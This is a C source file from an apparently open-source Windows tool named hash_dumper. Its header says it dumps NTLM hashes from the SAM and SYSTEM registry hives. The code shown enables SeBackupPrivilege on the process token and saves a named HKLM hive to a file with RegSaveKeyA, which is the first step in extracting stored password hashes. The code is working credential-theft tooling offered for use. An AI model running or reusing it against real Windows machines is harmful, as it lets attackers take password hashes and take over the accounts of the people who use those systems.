/*
	Copyright (C) 2023 Nikita Retr0-code Korneev

	hash_dumper is free software: you can redistribute, modify it
	under the terms of the GNU Affero General Public License version 3.

	You should have received a copy of GNU Affero General Public License
	version 3 along with hash_dumper.
	If not, see <https://www.gnu.org/licenses/agpl-3.0.html>.

----

	This file defines functions for dumping NTLM hashes from SAM and SYSTEM
*/

#include "hash_dump.h"

int reg_save_key(const char* key_name, const char* save_to)
{
	HANDLE token_handle = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token_handle) == 0)
	{
		CloseHandle(token_handle);
		return -1;
	}

	// Enabling requered priviles
	if (enable_privilege(token_handle, SE_BACKUP_NAME, TRUE) != 0)
	{
		CloseHandle(token_handle);
		return -1;
	}

	// Opening registry hive
	HKEY hive_handle = NULL;
	if (RegOpenKeyA(HKEY_LOCAL_MACHINE, key_name, &hive_handle) != ERROR_SUCCESS)
		return -2;

	// Saving hive to file
	if (RegSaveKeyA(hive_handle, save_to, NULL) != ERROR_SUCCESS)
		return -3;

	// Cleanup
	RegCloseKey(hive_handle);
	CloseHandle(token_handle);
	return 0;
}

int enable_privilege(HANDLE token_handle, LPCTSTR privilege, BOOL enable)
{
	TOKEN_PRIVILEGES token_priveleges;
	LUID luid;

	// Getting LUID
	if (LookupPrivilegeValueW(NULL, privilege, &luid) == 0)
		return -1;

	// Setting up token privileges
	token_priveleges.PrivilegeCount = 1;
	token_priveleges.Privileges[0].Luid = luid;

	// Checking enable or disable privileges
	if (enable)
		token_priveleges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		token_priveleges.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.
	if (AdjustTokenPrivileges(token_handle, FALSE, &token_priveleges, sizeof(TOKEN_PRIVILEGES), NULL, NULL) == 0)
		return -2;

	return 0;
}
